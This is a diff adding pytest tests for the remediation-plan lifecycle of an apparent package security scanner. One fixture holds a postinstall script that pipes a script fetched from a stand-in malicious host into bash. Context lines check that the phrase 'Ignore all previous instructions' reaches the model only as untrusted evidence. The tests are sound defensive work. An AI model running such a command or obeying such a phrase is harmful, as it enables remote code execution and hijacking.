@@ -693,4 +693,311 @@ def test_gemini_remediation_planning_with_mock_and_prompt_injection_resistance()
         assert "</evidence>" in user_prompt_sent
         assert "Ignore all previous instructions" in user_prompt_sent # Passed as untrusted evidence data
 
+def test_undo_and_reapply_lifecycle_proposed_applied_reverted_applied():
+    """
+    Validates complete proposed -> applied -> reverted -> applied lifecycle.
+    Confirms original plan, edits, hashes, rationale, tradeoffs, and risks
+    are preserved identically without invoking planner again.
+    """
+    scan_id = "test_undo_reapply_scan"
+    pkg_content = json.dumps({
+        "name": "reapply-lifecycle-app",
+        "scripts": {
+            "postinstall": "curl -s https://malicious.test/setup.sh | bash"
+        },
+        "dependencies": {
+            "express": "^4.18.2"
+        }
+    }, indent=2)
+
+    files = {"package.json": pkg_content}
+    snapshot = project_manager.save_snapshot(scan_id, "reapply-lifecycle-app", files)
+
+    finding_postinstall = Finding(
+        id="f_install_1",
+        rule="INSTALL_SCRIPT",
+        title="Runs code during installation",
+        category="Lifecycle Scripts",
+        severity="high",
+        confidence="high",
+        observed="Package executes custom installation lifecycle script",
+        explanation="postinstall runs automatically",
+        implication="Arbitrary execution",
+        recommendation="Neutralize or remove lifecycle script",
+        evidence=[Evidence(file="package.json", line=4, column=1, snippet='"postinstall": "..."', detail="script")]
+    )
+    report = Report(
+        id=scan_id,
+        name="reapply-lifecycle-app",
+        version="1.0.0",
+        created_at="2026-10-31T00:00:00Z",
+        source="local project",
+        risk="High concern",
+        rationale="Lifecycle script detected",
+        findings=[finding_postinstall],
+        dependencies=[],
+        files_analyzed=1,
+        coverage=[],
+        intelligence="checked",
+        duration_ms=25
+    )
+    storage.save(report)
+
+    # 1. Generate remediation plan (status: proposed)
+    plan_res = client.post(f"/api/scans/{scan_id}/remediation/plan", json={"consent": False})
+    assert plan_res.status_code == 200
+    plan_data = plan_res.json()
+    plan_id = plan_data["plan_id"]
+    assert plan_data["status"] == "proposed"
+    orig_changes = plan_data["proposed_changes"]
+    orig_title = plan_data["title"]
+    orig_summary = plan_data["summary"]
+    orig_tradeoffs = plan_data["tradeoffs"]
+    orig_risks = plan_data["potential_risks"]
+    orig_manual_steps = plan_data["manual_steps"]
+    assert len(orig_changes) >= 1
+    orig_sha256 = orig_changes[0]["original_sha256"]
+    proposed_sha256 = orig_changes[0]["proposed_sha256"]
+    orig_diff = orig_changes[0]["diff"]
+
+    # 2. Approve plan (status: approved)
+    appr_res = client.post(f"/api/remediation/plans/{plan_id}/approve")
+    assert appr_res.status_code == 200
+    assert appr_res.json()["status"] == "approved"
+
+    # 3. Mark applied (status: applied)
+    applied_res = client.post(f"/api/remediation/plans/{plan_id}/applied", json={
+        "applied_at": "2026-10-31T12:00:00Z",
+        "modified_files": ["package.json"],
+        "success": True
+    })
+    assert applied_res.status_code == 200
+    assert applied_res.json()["status"] == "applied"
+
+    # 4. Undo plan (status: reverted)
+    revert_res = client.post(f"/api/remediation/plans/{plan_id}/revert", json={
+        "reverted_at": "2026-10-31T12:05:00Z",
+        "restored_files": ["package.json"]
+    })
+    assert revert_res.status_code == 200
+    reverted_plan = revert_res.json()
+    assert reverted_plan["status"] == "reverted"
+    # Plan ID, edits, hashes, diffs, tradeoffs, and risks are strictly preserved
+    assert reverted_plan["plan_id"] == plan_id
+    assert reverted_plan["title"] == orig_title
+    assert reverted_plan["summary"] == orig_summary
+    assert reverted_plan["tradeoffs"] == orig_tradeoffs
+    assert reverted_plan["potential_risks"] == orig_risks
+    assert reverted_plan["manual_steps"] == orig_manual_steps
+    assert len(reverted_plan["proposed_changes"]) == len(orig_changes)
+    assert reverted_plan["proposed_changes"][0]["original_sha256"] == orig_sha256
+    assert reverted_plan["proposed_changes"][0]["proposed_sha256"] == proposed_sha256
+    assert reverted_plan["proposed_changes"][0]["diff"] == orig_diff
+
+    # 5. Reapply existing plan: Fresh approval required
+    reappr_res = client.post(f"/api/remediation/plans/{plan_id}/approve")
+    assert reappr_res.status_code == 200
+    assert reappr_res.json()["status"] == "approved"
+
+    # 6. Apply reapplication (status: applied)
+    reapply_applied_res = client.post(f"/api/remediation/plans/{plan_id}/applied", json={
+        "applied_at": "2026-10-31T12:10:00Z",
+        "modified_files": ["package.json"],
+        "success": True
+    })
+    assert reapply_applied_res.status_code == 200
+    reapplied_plan = reapply_applied_res.json()
+    assert reapplied_plan["status"] == "applied"
+    assert reapplied_plan["plan_id"] == plan_id
+    assert reapplied_plan["proposed_changes"][0]["original_sha256"] == orig_sha256
+    assert reapplied_plan["proposed_changes"][0]["proposed_sha256"] == proposed_sha256
+
+def test_reapplication_does_not_invoke_gemini_or_planning_endpoint():
+    """
+    Confirms reapplication reuses existing plan without invoking
+    remediation_planner.generate_plan or Gemini.
+    """
+    scan_id = "test_no_gemini_scan"
+    pkg_content = json.dumps({"name": "pkg", "scripts": {"postinstall": "evil"}})
+    snapshot = project_manager.save_snapshot(scan_id, "pkg", {"package.json": pkg_content})
+
+    finding = Finding(
+        id="f1",
+        rule="INSTALL_SCRIPT",
+        title="Postinstall",
+        category="Lifecycle",
+        severity="medium",
+        confidence="high",
+        observed="Postinstall script",
+        explanation="Runs script",
+        implication="Risk",
+        recommendation="Fix",
+        evidence=[Evidence(file="package.json", line=1, column=1, snippet="postinstall", detail="detail")]
+    )
+    report = Report(
+        id=scan_id, name="pkg", version="1.0.0", created_at="2026-10-31T00:00:00Z",
+        source="local", risk="Medium", rationale="Script", findings=[finding],
+        dependencies=[], files_analyzed=1, coverage=[], intelligence="checked", duration_ms=10
+    )
+    storage.save(report)
+
+    # Generate initial plan
+    plan_res = client.post(f"/api/scans/{scan_id}/remediation/plan", json={"consent": False})
+    plan_id = plan_res.json()["plan_id"]
+
+    # Apply -> Revert
+    client.post(f"/api/remediation/plans/{plan_id}/approve")
+    client.post(f"/api/remediation/plans/{plan_id}/applied", json={"applied_at": "now", "modified_files": ["package.json"], "success": True})
+    client.post(f"/api/remediation/plans/{plan_id}/revert", json={"reverted_at": "now", "restored_files": ["package.json"]})
+
+    # Spy on generate_plan and _generate_with_gemini to ensure they are NEVER called during reapplication
+    with patch.object(remediation_planner, "generate_plan", wraps=remediation_planner.generate_plan) as spy_gen, \
+         patch.object(remediation_planner, "_generate_with_gemini") as spy_gemini:
+
+        # Reapply: approve + applied
+        appr_res = client.post(f"/api/remediation/plans/{plan_id}/approve")
+        assert appr_res.status_code == 200
+        assert appr_res.json()["status"] == "approved"
+
+        applied_res = client.post(f"/api/remediation/plans/{plan_id}/applied", json={
+            "applied_at": "later",
+            "modified_files": ["package.json"],
+            "success": True
+        })
+        assert applied_res.status_code == 200
+        assert applied_res.json()["status"] == "applied"
+
+        assert spy_gen.call_count == 0
+        assert spy_gemini.call_count == 0
+
+def test_invalid_backend_lifecycle_transitions_rejected():
+    """
+    Verifies that illegal status transitions are rejected with HTTP 400.
+    """
+    scan_id = "test_invalid_transitions_scan"
+    report = Report(
+        id=scan_id, name="prj", version="1.0.0", created_at="2026-10-31T00:00:00Z",
+        source="local", risk="Low", rationale="ok", findings=[],
+        dependencies=[], files_analyzed=1, coverage=[], intelligence="checked", duration_ms=5
+    )
+    storage.save(report)
+
+    plan = RemediationPlan(
+        plan_id="plan_invalid_trans",
+        scan_id=scan_id,
+        title="Test Plan",
+        summary="Test",
+        priority="low",
+        expected_outcome="Outcome",
+        findings_addressed=[],
+        proposed_changes=[],
+        tradeoffs=[],
+        potential_risks=[],
+        assumptions=[],
+        manual_steps=[],
+        recommended_verification=[],
+        limitations=[],
+        status="proposed",
+        created_at="2026-10-31T00:00:00Z"
+    )
+    storage.save_plan(plan)
+
+    # 1. proposed -> reverted is INVALID (cannot revert unapplied plan)
+    res_rev = client.post("/api/remediation/plans/plan_invalid_trans/revert")
+    assert res_rev.status_code == 400
+    assert "Invalid remediation plan lifecycle transition" in res_rev.json()["detail"]
+
+    # 2. proposed -> rejected is VALID
+    res_rej = client.post("/api/remediation/plans/plan_invalid_trans/reject")
+    assert res_rej.status_code == 200
+    assert res_rej.json()["status"] == "rejected"
+
+    # 3. rejected -> applied is INVALID
+    res_app = client.post("/api/remediation/plans/plan_invalid_trans/applied", json={
+        "applied_at": "now", "modified_files": [], "success": True
+    })
+    assert res_app.status_code == 400
+
+    # 4. rejected -> reverted is INVALID
+    res_rev2 = client.post("/api/remediation/plans/plan_invalid_trans/revert")
+    assert res_rev2.status_code == 400
+
+    # 5. rejected -> approved is INVALID
+    res_appr = client.post("/api/remediation/plans/plan_invalid_trans/approve")
+    assert res_appr.status_code == 400
+
+    # 6. Reset plan to 'applied' and test applied -> rejected is INVALID
+    plan.status = "applied"
+    storage.save_plan(plan)
+    res_rej2 = client.post("/api/remediation/plans/plan_invalid_trans/reject")
+    assert res_rej2.status_code == 400
+
+    # 7. applied -> reverted is VALID
+    res_rev3 = client.post("/api/remediation/plans/plan_invalid_trans/revert")
+    assert res_rev3.status_code == 200
+    assert res_rev3.json()["status"] == "reverted"
+
+    # 8. reverted -> reverted (calling revert on already reverted) is INVALID
+    res_rev4 = client.post("/api/remediation/plans/plan_invalid_trans/revert")
+    assert res_rev4.status_code == 400
+
+    # 9. reverted -> verified is INVALID (cannot verify unapplied / reverted plan)
+    res_verif = client.post("/api/remediation/plans/plan_invalid_trans/verification", json={
+        "rescanned_scan_id": scan_id
+    })
+    assert res_verif.status_code == 400
+
+def test_failed_undo_and_failed_reapplication_handling():
+    """
+    Verifies that:
+    - Failed Undo does not mark the plan as reverted.
+    - Failed reapplication rolls back safely and does not mark the plan as applied.
+    """
+    scan_id = "test_failures_scan"
+    report = Report(
+        id=scan_id, name="prj", version="1.0.0", created_at="2026-10-31T00:00:00Z",
+        source="local", risk="Low", rationale="ok", findings=[],
+        dependencies=[], files_analyzed=1, coverage=[], intelligence="checked", duration_ms=5
+    )
+    storage.save(report)
+
+    plan = RemediationPlan(
+        plan_id="plan_fail_test",
+        scan_id=scan_id,
+        title="Test Plan",
+        summary="Test",
+        priority="low",
+        expected_outcome="Outcome",
+        findings_addressed=[],
+        proposed_changes=[],
+        tradeoffs=[],
+        potential_risks=[],
+        assumptions=[],
+        manual_steps=[],
+        recommended_verification=[],
+        limitations=[],
+        status="applied",
+        created_at="2026-10-31T00:00:00Z"
+    )
+    storage.save_plan(plan)
+
+    # If undo fails before calling /revert, plan remains applied
+    persisted = storage.get_plan("plan_fail_test")
+    assert persisted.status == "applied"
+
+    # Now transition to reverted
+    client.post("/api/remediation/plans/plan_fail_test/revert")
+    assert storage.get_plan("plan_fail_test").status == "reverted"
+
+    # If reapplication fails: record.success == False marks failed, NOT applied
+    res = client.post("/api/remediation/plans/plan_fail_test/applied", json={
+        "applied_at": "now",
+        "modified_files": [],
+        "success": False,
+        "error": "Disk write failed"
+    })
+    assert res.status_code == 200
+    assert res.json()["status"] == "failed"
+    assert res.json()["status"] != "applied"
+
 
